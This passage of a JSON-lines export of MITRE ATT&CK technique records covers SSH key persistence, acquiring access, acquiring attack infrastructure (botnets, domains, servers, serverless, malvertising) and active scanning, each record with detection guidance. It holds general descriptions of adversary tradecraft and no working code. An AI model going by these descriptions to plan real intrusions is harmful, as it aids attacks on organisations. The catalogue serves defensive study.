added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)","url":"https://attack.mitre.org/techniques/T1098/004","created":"24 June 2020","last modified":"12 April 2023","version":"1.2","tactics":"Persistence","detection":"Use file integrity monitoring to detect changes made to the <code>authorized_keys</code> file for each user on a system. Monitor for suspicious processes modifying the <code>authorized_keys</code> file. In cloud environments, monitor instances for modification of metadata and configurations.\n\nMonitor for changes to and suspicious processes modifiying <code>/etc/ssh/sshd_config</code>.\n\nFor network infrastructure devices, collect AAA logging to monitor for rogue SSH keys being added to accounts.","platforms":"IaaS, Linux, Network, macOS","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1098","defenses bypassed":null,"contributors":"Austin Clark, @c2defense; Dror Alon, Palo Alto Networks; Or Kliger, Palo Alto Networks; Tony Lambert, Red Canary","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Aqua TeamTNT August 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Cisco Talos Intelligence Group),(Citation: trendmicro xcsset xcode project 2020),(Citation: Trend Micro Skidmap),"}
{"ID":"T1650","name":"Acquire Access","description":"Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)(Citation: Krebs Access Brokers Fortune 500) In some cases, adversary groups may form partnerships to share compromised systems with each other.(Citation: CISA Karakurt 2022)\n\nFootholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., [Web Shell](https://attack.mitre.org/techniques/T1505/003)) or established access via [External Remote Services](https://attack.mitre.org/techniques/T1133). In some cases, access brokers will implant compromised systems with a “load” that can be used to install additional malware for paying customers.(Citation: Microsoft Ransomware as a Service)\n\nBy leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)\n\nIn some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a [Trusted Relationship](https://attack.mitre.org/techniques/T1199), [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111), or even [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195).\n\n**Note:** while this technique is distinct from other behaviors such as [Purchase Technical Data](https://attack.mitre.org/techniques/T1597/002) and [Credentials](https://attack.mitre.org/techniques/T1589/001), they may often be used in conjunction (especially where the acquired foothold requires [Valid Accounts](https://attack.mitre.org/techniques/T1078)).","url":"https://attack.mitre.org/techniques/T1650","created":"10 March 2023","last modified":"14 April 2023","version":"1.0","tactics":"Resource Development","detection":"Much of this takes place outside the visibility of the target organization, making detection difficult for defenders. \n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access. ","platforms":"PRE","data sources":null,"is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Jeffrey Barto; Jeremy Kennelly","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1583","name":"Acquire Infrastructure","description":"Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090).(Citation: amnesty_nso_pegasus) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.","url":"https://attack.mitre.org/techniques/T1583","created":"30 September 2020","last modified":"02 March 2023","version":"1.2","tactics":"Resource Development","detection":"Consider use of services that may aid in tracking of newly acquired infrastructure, such as WHOIS databases for domain registration information. \n\nOnce adversaries have provisioned infrastructure (ex: a server for use in command and control), internet scans may help proactively discover adversary acquired infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":"PRE","data sources":"Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS, Internet Scan: Response Content, Internet Scan: Response Metadata","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Shailesh Tiwary (Indian Army)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1583.005","name":"Acquire Infrastructure: Botnet","description":"Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)","url":"https://attack.mitre.org/techniques/T1583/005","created":"01 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Resource Development","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during [Phishing](https://attack.mitre.org/techniques/T1566), [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499), or [Network Denial of Service](https://attack.mitre.org/techniques/T1498).","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1583","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1583.002","name":"Acquire Infrastructure: DNS Server","description":"Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\n\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)","url":"https://attack.mitre.org/techniques/T1583/002","created":"01 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Resource Development","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1583","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Novetta-Axiom),(Citation: Zscaler Lyceum DnsSystem June 2022),"}
{"ID":"T1583.001","name":"Acquire Infrastructure: Domains","description":"Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)","url":"https://attack.mitre.org/techniques/T1583/001","created":"30 September 2020","last modified":"30 March 2023","version":"1.2","tactics":"Resource Development","detection":"Domain registration information is, by design, captured in public registration logs. Consider use of services that may aid in tracking of newly acquired domains, such as WHOIS databases and/or passive DNS. In some cases it may be possible to pivot on known pieces of domain registration information to uncover other infrastructure purchased by the adversary. Consider monitoring for domains created with a similar structure to your own, including under a different TLD. Though various tools and services exist to track, query, and monitor domain name registration information, tracking across multiple DNS infrastructures can require multiple tools/services or more advanced analytics.(Citation: ThreatConnect Infrastructure Dec 2020)\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access and Command and Control.","platforms":"PRE","data sources":"Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS","is sub-technique":true,"sub-technique of":"T1583","defenses bypassed":null,"contributors":"Deloitte Threat Library Team; Menachem Goldstein; Oleg Kolesnikov, Securonix; Vinayak Wadhwa, Lucideus; Wes Hurd","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Certfa Charming Kitten January 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: Dragos Hexane),(Citation: ESET Lazarus Jun 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Mandiant APT1),(Citation: ClearSky Siamesekitten August 2021),(Citation: Palo Alto Black-T October 2020),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Google TAG Lazarus Jan 2021),(Citation: Volexity Ocean Lotus November 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: McAfee Honeybee),(Citation: Unit 42 Gamaredon February 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: Recorded Future REDDELTA July 2020),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Mandiant UNC3890 Aug 2022),(Citation: CISA AA20-301A Kimsuky),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: eSentire FIN7 July 2021),(Citation: SecureWorks August 2019),(Citation: Malwarebytes Silent Librarian October 2020),(Citation: Korean FSI TA505 2020),(Citation: Talos Transparent Tribe May 2021),(Citation: BlackBerry CostaRicto November 2020),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: Google EXOTIC LILY March 2022),(Citation: ESET Operation Spalax Jan 2021),(Citation: Microsoft Targeting Elections September 2020),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: Phish Labs Silent Librarian),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: McAfee Dianxun March 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Proofpoint TA407 September 2019),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Secureworks COBALT DICKENS August 2018),(Citation: FireEye APT29 Nov 2018),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Accenture MUDCARP March 2019),(Citation: Lunghi Iron Tiger Linux),(Citation: US District Court Indictment GRU Oct 2018),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Microsoft Actinium February 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ThreatConnect Kimsuky September 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: FireEye APT28),(Citation: Cylance Dust Storm),(Citation: KISA Operation Muzabi),(Citation: Kaspersky Winnti April 2013),(Citation: DOJ Iran Indictments March 2018),(Citation: ESET Dukes October 2019),(Citation: Zdnet Kimsuky Group September 2020),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: DOJ APT10 Dec 2018),(Citation: Cybereason Kimsuky November 2020),"}
{"ID":"T1583.008","name":"Acquire Infrastructure: Malvertising","description":"Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.(Citation: spamhaus-malvertising) Purchased ads may also target specific audiences using the advertising network’s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. \n\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary’s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising) \n\nMalvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.(Citation: BBC-malvertising)\n\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.(Citation: spamhaus-malvertising) ","url":"https://attack.mitre.org/techniques/T1583/008","created":"21 February 2023","last modified":"17 April 2023","version":"1.0","tactics":"Resource Development","detection":null,"platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1583","defenses bypassed":null,"contributors":"Goldstein Menachem; Hiroki Nagahama, NEC Corporation; Juan Carlos Campuzano - Mnemo-CERT; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Tom Hegel","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1583.004","name":"Acquire Infrastructure: Server","description":"Adversaries may buy, lease, or rent physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Adversaries may use web servers to support support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations. Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations.\n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)","url":"https://attack.mitre.org/techniques/T1583/004","created":"01 October 2020","last modified":"12 April 2023","version":"1.2","tactics":"Resource Development","detection":"Once adversaries have provisioned a server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":"PRE","data sources":"Internet Scan: Response Content, Internet Scan: Response Metadata","is sub-technique":true,"sub-technique of":"T1583","defenses bypassed":null,"contributors":"Dor Edry, Microsoft","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET Lazarus Jun 2020),(Citation: McAfee Night Dragon),(Citation: Microsoft GALLIUM December 2019),(Citation: KISA Operation Muzabi),(Citation: FoxIT Wocao December 2019),(Citation: McAfee Honeybee),"}
{"ID":"T1583.007","name":"Acquire Infrastructure: Serverless","description":"Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)","url":"https://attack.mitre.org/techniques/T1583/007","created":"08 July 2022","last modified":"20 October 2022","version":"1.0","tactics":"Resource Development","detection":null,"platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1583","defenses bypassed":null,"contributors":"Awake Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1583.003","name":"Acquire Infrastructure: Virtual Private Server","description":"Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)","url":"https://attack.mitre.org/techniques/T1583/003","created":"01 October 2020","last modified":"17 October 2021","version":"1.1","tactics":"Resource Development","detection":"Once adversaries have provisioned a VPS (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":"PRE","data sources":"Internet Scan: Response Content, Internet Scan: Response Metadata","is sub-technique":true,"sub-technique of":"T1583","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye TRITON 2019),(Citation: Novetta-Axiom),(Citation: Gigamon Berserk Bear October 2021),(Citation: Microsoft HAFNIUM March 2020),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1583.006","name":"Acquire Infrastructure: Web Services","description":"Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.","url":"https://attack.mitre.org/techniques/T1583/006","created":"01 October 2020","last modified":"12 April 2023","version":"1.2","tactics":"Resource Development","detection":"Once adversaries leverage the web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.(Citation: ThreatConnect Infrastructure Dec 2020)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1583","defenses bypassed":null,"contributors":"Dor Edry, Microsoft","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: TrendMicro Confucius APT Feb 2018),(Citation: Trend Micro Muddy Water March 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: McAfee Sharpshooter December 2018),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: HackerNews IndigoZebra July 2021),(Citation: Volexity Ocean Lotus November 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: MSTIC NOBELIUM May 2021),(Citation: Microsoft POLONIUM June 2022),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Talos Kimsuky Nov 2021),(Citation: FireEye APT17),(Citation: ClearSky Lazarus Aug 2020),(Citation: Microsoft HAFNIUM March 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Google Election Threats October 2020),(Citation: Anomali Static Kitten February 2021),(Citation: ESET Crutch December 2020),(Citation: FireEye APT29),"}
{"ID":"T1595","name":"Active Scanning","description":"Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\n\nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).","url":"https://attack.mitre.org/techniques/T1595","created":"02 October 2020","last modified":"08 March 2022","version":"1.0","tactics":"Reconnaissance","detection":"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1595.001","name":"Active Scanning: Scanning IP Blocks","description":"Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.\n\nAdversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).","url":"https://attack.mitre.org/techniques/T1595/001","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet).\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":"Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1595","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro TeamTNT),"}
{"ID":"T1595.002","name":"Active Scanning: Vulnerability Scanning","description":"Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).","url":"https://attack.mitre.org/techniques/T1595/002","created":"02 October 2020","last modified":"13 March 2023","version":"1.0","tactics":"Reconnaissance","detection":"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1595","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Check Point APT35 CharmPower January 2022),(Citation: TrendMicro Pawn Storm 2019),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Trend Micro TeamTNT),"}
{"ID":"T1595.003","name":"Active Scanning: Wordlist Scanning","description":"Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\n\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  \n\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. ","url":"https://attack.mitre.org/techniques/T1595/003","created":"04 March 2022","last modified":"15 April 2022","version":"1.0","tactics":"Reconnaissance","detection":"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Monitor for access to S3 buckets, especially those that are not intended to be publicly accessible. \n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. \n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":"Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1595","defenses bypassed":null,"contributors":"Elvis Veliz, Citi; Jan Petrov, Citi; Richard Julian, Citi","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ClearSky Lebanese Cedar Jan 2021),"}
